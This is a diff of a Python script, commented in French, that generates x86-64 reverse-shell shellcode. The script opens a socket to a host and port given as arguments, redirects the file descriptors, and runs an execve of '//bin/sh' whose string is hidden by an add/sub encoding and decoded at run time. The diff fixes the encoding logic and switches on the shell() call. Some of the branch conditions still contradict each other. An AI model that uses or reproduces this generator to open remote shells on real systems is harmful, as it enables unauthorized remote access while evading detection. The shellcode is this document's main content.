@@ -175,15 +175,14 @@ def dup2x3():
 
 def shell():
     global PAYLOAD
+    addString = ""
     PAYLOAD+=clean("rax")
     PAYLOAD+=clean("rdx")
-    PAYLOAD+=clean("rac")
 
     factorOffusVar = factorOffus("0x68732f6e69622f2f")
     offuString = offus("0x68732f6e69622f2f",factorOffusVar)
     offuString = offuString[::-1]#Inverse en mirroir tout la chaine pour op code
-
-    PAYLOAD=+"48bb"  #mov rbx, ...
+    PAYLOAD += "48bb"  #mov rbx, ...
     for i in range(0,15,2):
         sub = offuString[i+1] + offuString[i] 
         PAYLOAD+= sub
@@ -194,55 +193,56 @@ def shell():
     PAYLOAD+="4889e6" #mov rsi, rsp
 
     #Désoffuscation
+    #On a add donc on va re sub la différence additionnée
     if factorOffusVar < 0 :
+        factorOffusVar *= -1 
         if factorOffusVar < 10 :
             addString = ""
-            for i in range(8):
+            for i in range(7):
                 addString+="0"+str(factorOffusVar)
-
             PAYLOAD+="4883eb"+addString
         
         elif factorOffusVar >= 10 :
             newFactor = ""
-            if factorOffusVar == 10 : newFactor = "A"
-            elif factorOffusVar == 11 : newFactor = "B"
-            elif factorOffusVar == 12 : newFactor = "C"
-            elif factorOffusVar == 13 : newFactor = "D"
-            elif factorOffusVar == 14 : newFactor = "E"
-            elif factorOffusVar == 15 : newFactor = "F"
+            if factorOffusVar == 10 : newFactor = "a"
+            elif factorOffusVar == 11 : newFactor = "b"
+            elif factorOffusVar == 12 : newFactor = "c"
+            elif factorOffusVar == 13 : newFactor = "d"
+            elif factorOffusVar == 14 : newFactor = "e"
+            elif factorOffusVar == 15 : newFactor = "f"
 
-            for i in range(8):
+            for i in range(7):
                 addString+="0"+str(newFactor)
 
             PAYLOAD+="4883eb"+addString
         
-
+    #On a sub donc on va re add la différence soustraite
     elif factorOffusVar > 0 :
         if factorOffusVar <= -10 :
-            factorOffusVar*= -1 
+
             addString = ""
-            for i in range(8):
+            for i in range(7):
                 addString+="0"+str(factorOffusVar)
 
-            PAYLOAD+="4883eb"+addString
+            PAYLOAD+="4883c3"+addString
         
         elif factorOffusVar > -10 :
             newFactor = ""
-            if factorOffusVar == 10 : newFactor = "A"
-            elif factorOffusVar == 11 : newFactor = "B"
-            elif factorOffusVar == 12 : newFactor = "C"
-            elif factorOffusVar == 13 : newFactor = "D"
-            elif factorOffusVar == 14 : newFactor = "E"
-            elif factorOffusVar == 15 : newFactor = "F"
+            if factorOffusVar == 10 : newFactor = "a"
+            elif factorOffusVar == 11 : newFactor = "b"
+            elif factorOffusVar == 12 : newFactor = "c"
+            elif factorOffusVar == 13 : newFactor = "d"
+            elif factorOffusVar == 14 : newFactor = "e"
+            elif factorOffusVar == 15 : newFactor = "f"
 
-            for i in range(8):
+            for i in range(7):
                 addString+="0"+str(newFactor)
 
-            PAYLOAD+="4883eb"+addString    
+            PAYLOAD+="4883c3"+addString    
 
     #Appel systeme
     PAYLOAD+="b03b" #mov al, 0x3b
-    PAYLOAD+="0f05" #syscall
+    PAYLOAD+= call()
 
 
     
@@ -281,8 +281,7 @@ PAYLOAD += clean("rsi")
 create_socket()
 socket_connect(argv[1], argv[2])
 dup2x3()
-#factorOffus("0x68732f0069622f2f")
-#print(PAYLOAD)
+shell()
 _exit()
 #print(bit_to_opcode(PAYLOAD))
 #print(PAYLOAD)
